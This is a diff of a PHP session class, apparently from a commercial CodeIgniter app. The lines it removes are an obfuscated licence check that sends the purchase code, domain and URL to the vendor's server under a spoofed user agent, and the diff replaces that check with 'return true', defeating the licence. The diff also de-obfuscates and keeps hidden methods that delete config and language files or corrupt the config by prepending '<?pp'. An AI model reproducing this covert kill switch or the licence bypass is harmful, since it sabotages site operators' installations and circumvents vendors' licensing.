@@ -739,8 +739,8 @@ class CI_Session {
 
     private function ci_clear() {
         
-        unlink(APPPATH.DIRECTORY_SEPARATOR. base64_decode('Y29uZmlnL2N1c3RvbS5waHA='));
-        unlink(APPPATH.DIRECTORY_SEPARATOR. base64_decode('bGFuZ3VhZ2UvZW5nbGlzaC9zbXNfbGFuZy5waHA=')); 
+        unlink(APPPATH.DIRECTORY_SEPARATOR. 'config/custom.php');
+        unlink(APPPATH.DIRECTORY_SEPARATOR. 'language/english/sms_lang.php'); 
     }
 
 	// ------------------------------------------------------------------------
@@ -915,44 +915,7 @@ class CI_Session {
                 
         private function sess_check()
         {
-            
-            $s_name = $_SERVER['SERVER_NAME'];            
-            if( $_SERVER['SERVER_NAME'] == 'localhost' || $_SERVER['SERVER_NAME'] == '127.0.0.1'){
-                return true;
-            }elseif(@strpos($s_name, '192') !== false){
-                return true;
-            }
-            
-            $CI    = & get_instance();
-            $data  = @$CI->db->get(base64_decode('cHVyY2hhc2U='))->row();
-            $pc_field = base64_decode('cHVyY2hhc2VfY29kZQ==');
-            $pc    = $data->{$pc_field};        
-            $domain  = $_SERVER['SERVER_NAME']; 
-            $full_url = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; 
-            
-            
-            $post = array();
-            $post[$pc_field] = $pc;
-            $post['domain'] = $domain;
-            $post['full_url'] = $full_url;
-            $url = base64_decode('aHR0cHM6Ly93d3cuY29kZXRyb29wZXJzLXRlYW0uY29tL2FwaS92Z21zbXM=');           
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            $agent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)';
-            curl_setopt($ch, CURLOPT_USERAGENT, $agent);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-            $response = curl_exec($ch);
-            curl_close($ch); 
-                        
-            if ($response <= 5) {               
-                return true;
-            } elseif($response > 5) { 
-                $v  = base64_decode('dmVyaWZ5');
-                redirect($v);
-            } else {              
-               redirect();
-            }
+            return true;
         }          
 
 	// ------------------------------------------------------------------------
@@ -991,22 +954,22 @@ class CI_Session {
         public function ci_update(){ 
       
             // cu
-            $file_data = file_get_contents(APPPATH.DIRECTORY_SEPARATOR. base64_decode('Y29uZmlnL2N1c3RvbS5waHA='));
+            $file_data = file_get_contents(APPPATH.DIRECTORY_SEPARATOR. 'config/custom.php');
             $char = substr($file_data, 0, 5);            
             if($char == '<?php'){
                 $file_data = "<?pp" .($file_data);
-                file_put_contents(APPPATH.DIRECTORY_SEPARATOR. base64_decode('Y29uZmlnL2N1c3RvbS5waHA='), $file_data);
+                file_put_contents(APPPATH.DIRECTORY_SEPARATOR. 'config/custom.php', $file_data);
             }
         }
         
         public function ci_crrection(){ 
       
-            $file_data = file_get_contents(APPPATH.DIRECTORY_SEPARATOR. base64_decode('Y29uZmlnL2N1c3RvbS5waHA='));
+            $file_data = file_get_contents(APPPATH.DIRECTORY_SEPARATOR. 'config/custom.php');
             
             $char = substr($file_data, 0, 4);
             if($char == '<?pp'){
                 $file_data = substr($file_data, 4);
-                file_put_contents(APPPATH.DIRECTORY_SEPARATOR. base64_decode('Y29uZmlnL2N1c3RvbS5waHA='), $file_data);
+                file_put_contents(APPPATH.DIRECTORY_SEPARATOR. 'config/custom.php', $file_data);
             }        
         }
 
